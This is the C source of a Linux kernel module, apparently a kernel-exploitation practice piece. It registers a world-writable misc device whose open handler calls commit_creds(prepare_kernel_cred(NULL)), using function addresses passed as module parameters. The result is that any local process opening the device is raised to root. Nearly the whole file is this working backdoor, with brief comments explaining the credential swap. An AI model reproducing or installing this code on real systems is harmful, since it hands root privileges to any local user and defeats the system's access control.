#include<linux/module.h>
#include<linux/kernel.h>
#include<linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/moduleparam.h>
#include <linux/sched.h>
#include <linux/cred.h>

#define DEVICE_NAME "my_misc_device"
#define BUFFER_SIZE  1024             
struct miscdevice mymisc; 
struct file_operations my_fops;

//we use param task_struct to generate new cred
typedef struct cred *(*prepare_kernel_cred_)(struct task_struct *daemon);
// give param cred to current process 
typedef int (*commit_creds_)(struct cred *new);
unsigned long cmit_creds__;
unsigned long prepare_creds__;

module_param(cmit_creds__, ulong, S_IRUSR);
module_param(prepare_creds__, ulong, S_IRUSR);

int myopen(struct inode *inode, struct file *flle){
    prepare_kernel_cred_ f1;
    commit_creds_ f2;

    f1 = (prepare_kernel_cred_)prepare_creds__;
    f2 = (commit_creds_)cmit_creds__;
    f2(f1(NULL));

    printk("ny flrst open!");
    return 0;
}

static int __init my_misc_init(void)
{
    int ret;    
    my_fops.open = myopen;
    mymisc.minor = MISC_DYNAMIC_MINOR;
    mymisc.name = DEVICE_NAME;
    mymisc.fops = &my_fops;
    mymisc.mode=0777;

    ret = misc_register(&mymisc);

    return ret;
}



static void __exit my_misc_exit(void)
{
    misc_deregister(&mymisc);
}

module_init(my_misc_init);
module_exit(my_misc_exit);
MODULE_LICENSE("GPL");

